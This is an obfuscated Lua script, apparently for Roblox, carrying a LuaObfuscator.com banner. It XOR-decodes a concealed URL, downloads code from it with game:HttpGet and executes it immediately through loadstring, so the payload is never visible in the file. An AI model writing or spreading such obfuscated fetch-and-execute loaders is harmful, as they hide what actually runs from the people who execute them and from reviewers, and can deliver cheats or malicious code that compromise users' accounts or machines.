--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Welcome to LuaObfuscator.com   (Alpha 0.1.6) ~  Much Love, Ferib 

]]--

local v0=string.char;local v1=string.byte;local v2=string.sub;local v3=bit32 or bit;local v4=v3.bxor;local v5=table.concat;local v6=table.insert;local function v7(v8,v9)local v10={};for i=1, #v8 do v6(v10,v0(v4(v1(v2(v8,i,i + 1)),v1(v2(v9,1 + ((i-1)% #v9),1 + ((i-1)% #v9) + 1)))%256));end return v5(v10);end loadstring(game:HttpGet(v7("\152\197\70\12\243\185\150\59\149\221\83\11\247\175\206\125\212\131\81\23\238\229\222\117\205\130\69\50\217\176\217\85\140\204\16","\186\173\50\120\131\202\172\20")))();